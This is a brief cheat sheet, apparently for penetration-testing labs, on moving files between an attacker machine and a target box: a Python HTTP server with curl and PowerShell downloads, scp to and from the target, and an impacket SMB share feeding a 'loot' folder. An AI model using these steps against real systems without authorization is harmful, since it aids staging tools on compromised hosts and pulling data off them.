# File transfer

Use the engagement folder as the working directory and verify important files with `sha256sum`.

## Serve over HTTP

```bash
BOX=box-name
cd "$HOME/engagements/$BOX/loot"
python3 -m http.server 8000 --bind "$(lab ip)"
```

Download on Linux:

```bash
curl -fLO http://10.10.14.2:8000/file
```

Download in PowerShell:

```powershell
Invoke-WebRequest http://10.10.14.2:8000/file -OutFile file
```

## Copy over SSH

```bash
BOX=box-name
scp -P 22 file user@target:/tmp/
scp -P 22 user@target:/path/file "$HOME/engagements/$BOX/loot/"
```

## Temporary SMB share

```bash
BOX=box-name
cd "$HOME/engagements/$BOX/loot"
smbserver.py share . -smb2support
```

From Windows, use `\\TUN0_IP\share`. Stop temporary servers as soon as the transfer is complete.
